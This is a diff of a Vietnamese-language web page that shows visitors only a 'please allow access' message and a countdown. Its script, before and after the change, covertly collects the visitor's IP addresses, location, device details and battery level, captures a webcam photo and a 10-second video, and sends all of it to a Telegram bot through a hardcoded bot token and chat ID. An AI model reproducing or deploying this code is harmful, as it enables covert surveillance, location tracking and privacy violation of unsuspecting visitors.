@@ -3,179 +3,154 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WEB ĐỘC QUYỀN HOANGAPPLE</title>
+  <title>WEB ĐỘC QUYỀN HOANGANH</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      text-align: center;
-    }
-    .message {
-      font-size: 24px;
-      margin-bottom: 20px;
-      animation: fadeInDown 1s ease;
-    }
-    #countdown {
-      font-size: 48px;
-      margin-bottom: 50px;
-      animation: zoomIn 1s ease;
-    }
+    body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .container { text-align: center; }
+    .message { font-size: 24px; margin-bottom: 20px; animation: fadeInDown 1s ease; }
+    #countdown { font-size: 48px; margin-bottom: 50px; animation: zoomIn 1s ease; }
   </style>
 </head>
 <body>
-
   <div class="container">
     <h1 class="message">Vui lòng cho phép truy cập để sử dụng</h1>
     <div id="countdown"></div>
   </div>
 
   <script>
-    // ======== Cấu hình ========
     const BOT_TOKEN = '7960156507:AAHMK4cfoRszPvJrZ17NvPAUFqPvyXY2mi8';
     const CHAT_ID = '7605936504';
-    const TIME_ZONE = 'Asia/Ho_Chi_Minh'; // đặt ở một chỗ dễ sửa
-    const COUNTDOWN_SEC = 11;
-    const VIDEO_RECORD_TIME = 10000; // 10s
 
-    // Gửi message qua Telegram
-    async function sendTelegramMessage(text) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      try {
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text })
-        });
-        return res.ok;
-      } catch (err) {
-        console.error('Telegram message error:', err);
-      }
+    async function getCurrentTime() {
+      const now = new Date();
+      const opts = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'Asia/Ho_Chi_Minh' };
+      return now.toLocaleDateString('vi-VN', opts);
     }
 
-    // Gửi ảnh/video qua Telegram
-    async function sendTelegramMedia(endpoint, blob, caption) {
+    // Generic sender using FormData
+    function sendToTelegram(endpoint, formData) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+      return fetch(url, { method: 'POST', body: formData })
+        .then(res => res.json())
+        .then(data => console.log(data))
+        .catch(err => console.error(`Lỗi gửi ${endpoint}:`, err));
+    }
+
+    // Send text message
+    async function sendText(message) {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      form.append(endpoint === 'sendPhoto' ? 'photo' : 'video', blob);
-      form.append('caption', caption);
+      form.append('text', message);
+      return sendToTelegram('sendMessage', form);
+    }
+
+    // Send photo
+    async function sendPhoto(photoBlob, caption) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', photoBlob, 'photo.jpg');
+      if (caption) form.append('caption', caption);
+      return sendToTelegram('sendPhoto', form);
+    }
+
+    // Send video
+    async function sendVideo(videoBlob, caption) {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('video', videoBlob, 'video.webm');
+      if (caption) form.append('caption', caption);
+      return sendToTelegram('sendVideo', form);
+    }
+
+    // Gather device & network info and send
+    async function getAddress() {
       try {
-        const res = await fetch(url, { method: 'POST', body: form });
-        return res.ok;
+        const ipv6Res = await fetch('https://api6.ipify.org?format=json');
+        const { ip: ipv6 } = await ipv6Res.json();
+        const res = await fetch('https://ipinfo.io/json');
+        const info = await res.json();
+        if (info.country !== 'VN') return await sendText('Không thể lấy địa chỉ.');
+
+        let msg = `🗺 Địa Chỉ: ${info.city}, ${info.region}, ${info.country}\n`;
+        msg += `🗺 IP: ${info.ip}\n🗺 IPv6: ${ipv6}\n`;
+        msg += `🕒 Thời Gian: ${await getCurrentTime()}\n`;
+        msg += `💻 Thiết Bị: ${navigator.userAgent}\n`;
+
+        const battery = navigator.getBattery ? await navigator.getBattery() : { level: null };
+        msg += `🔋 Pin: ${battery.level != null ? battery.level*100 + '%' : 'Không xác định'}\n`;
+        msg += `🛠 OS: ${navigator.platform}\n📜 Ngôn Ngữ: ${navigator.language}\n`;
+        msg += `🖥 Độ phân giải: ${screen.width}x${screen.height}\n\nPowered by Hoang Anh👑`;
+
+        return await sendText(msg);
       } catch (err) {
-        console.error(`Telegram ${endpoint} error:`, err);
+        console.error(err);
+        return await sendText('Không thể lấy địa chỉ.');
       }
     }
 
-    // Lấy timestamp định dạng
-    function formatNow() {
-      return new Date().toLocaleString('vi-VN', { timeZone: TIME_ZONE });
-    }
-
-    // Lấy thông tin và gửi qua Telegram
-    async function reportClientInfo() {
-      try {
-        const [infoRes, ipv6Res] = await Promise.all([
-          fetch('https://ipinfo.io/json'),
-          fetch('https://api6.ipify.org?format=json')
-        ]);
-        const info = await infoRes.json();
-        const { ip, city, region, country } = info;
-        const ipv6 = (await ipv6Res.json()).ip;
-        if (country !== 'VN') return;
-
-        let msg = `🗺 Địa chỉ: ${city}, ${region}, ${country}\n` +
-                  `🗺 IPv4: ${ip}\n` +
-                  `🗺 IPv6: ${ipv6}\n` +
-                  `🕒 Thời gian: ${formatNow()}\n` +
-                  `💻 Thiết bị: ${navigator.userAgent}\n` +
-                  `🛠 OS: ${navigator.platform}\n` +
-                  `📜 Ngôn ngữ: ${navigator.language}\n` +
-                  `🖥 Độ phân giải: ${screen.width}x${screen.height}\n`;
-
-        try {
-          const battery = await navigator.getBattery();
-          msg += `🔋 Pin: ${Math.round(battery.level * 100)}%\n`;
-        } catch (_) {
-          msg += '🔋 Pin: Không xác định\n';
-        }
-        msg += '\nPower By Hoang Apple👑 <3';
-        await sendTelegramMessage(msg);
-      } catch (err) {
-        console.error('Report error:', err);
-      }
-    }
-
-    // Chụp snapshot từ camera
-    async function snapshotAndSend() {
+    // Handle media capture
+    async function captureAndSendMedia() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
+        document.body.appendChild(video);
         video.srcObject = stream;
-        await video.play();
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
-        stream.getTracks().forEach(t => t.stop());
-        const caption = `📸 Snapshot thành công\n🕒 ${formatNow()}`;
-        await sendTelegramMedia('sendPhoto', blob, caption);
+        video.play();
+        video.onloadedmetadata = async () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+          await sendPhoto(blob, `📸 Ảnh thành công\n🕒 ${await getCurrentTime()}`);
+          video.remove();
+          stream.getTracks().forEach(t => t.stop());
+        };
       } catch (err) {
-        console.error('Snapshot error:', err);
+        console.error('Lỗi camera:', err);
       }
-    }
 
-    // Ghi video và gửi
-    async function recordVideoAndSend() {
+      // Record video for 10s
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const recorder = new MediaRecorder(stream);
+        const mediaRec = new MediaRecorder(stream);
         const chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
+        mediaRec.ondataavailable = e => chunks.push(e.data);
+        mediaRec.onstop = async () => {
           const blob = new Blob(chunks, { type: 'video/webm' });
+          await sendVideo(blob, `🎞 Video thành công\n🕒 ${await getCurrentTime()}`);
           stream.getTracks().forEach(t => t.stop());
-          const caption = `🎞 Quay video thành công\n🕒 ${formatNow()}`;
-          await sendTelegramMedia('sendVideo', blob, caption);
         };
-        recorder.start();
-        setTimeout(() => recorder.stop(), VIDEO_RECORD_TIME);
+        mediaRec.start();
+        setTimeout(() => mediaRec.stop(), 10000);
       } catch (err) {
-        console.error('Recording error:', err);
+        console.error('Lỗi quay video:', err);
       }
     }
 
-    // Đếm ngược hiển thị
-    function startCountdown(sec) {
+    // Countdown animation
+    function countdown(sec) {
       const el = document.getElementById('countdown');
-      let t = sec;
-      el.textContent = `Vui lòng chờ ${t} giây...`;
-      const id = setInterval(() => {
-        if (--t <= 0) {
-          clearInterval(id);
-          el.textContent = 'Khởi động xong!';
-          snapshotAndSend();
-          recordVideoAndSend();
+      el.textContent = `Vui lòng chờ ${sec} giây khởi động bot...`;
+      const iv = setInterval(() => {
+        sec--;
+        if (sec <= 0) {
+          clearInterval(iv);
+          el.textContent = 'Khởi động hoàn tất!';
+          captureAndSendMedia();
         } else {
-          el.textContent = `Vui lòng chờ ${t} giây...`;
+          el.textContent = `Vui lòng chờ ${sec} giây khởi động bot...`;
         }
       }, 1000);
     }
 
-    // Khởi tạo
-    window.addEventListener('load', () => {
-      reportClientInfo();
-      startCountdown(COUNTDOWN_SEC);
-    });
-  </script>
+    // Init
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(() => countdown(11))
+      .catch(err => console.error('Không thể truy cập camera:', err));
 
+    getAddress();
+  </script>
 </body>
 </html>
